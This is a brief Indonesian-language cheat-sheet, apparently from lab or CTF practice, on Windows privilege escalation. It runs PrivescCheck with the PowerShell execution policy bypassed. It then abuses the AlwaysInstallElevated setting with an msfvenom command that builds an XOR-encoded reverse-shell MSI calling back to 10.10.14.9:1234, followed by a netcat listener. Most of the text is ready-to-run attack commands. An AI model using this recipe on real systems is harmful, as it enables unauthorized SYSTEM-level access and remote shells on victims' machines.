# PrivescCheck 

dipake untuk cek privesc

    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

# Always Install Elevated

allow user buat install package dengan akses system
cara cek bis apaka `PrivescCheck` kalo enabled bisa pakai msfvenom buat bikin exploit

    msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=1234 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi

selanjutnya tinggal upload, listen, dan execute.

    nc -lvvp 1234

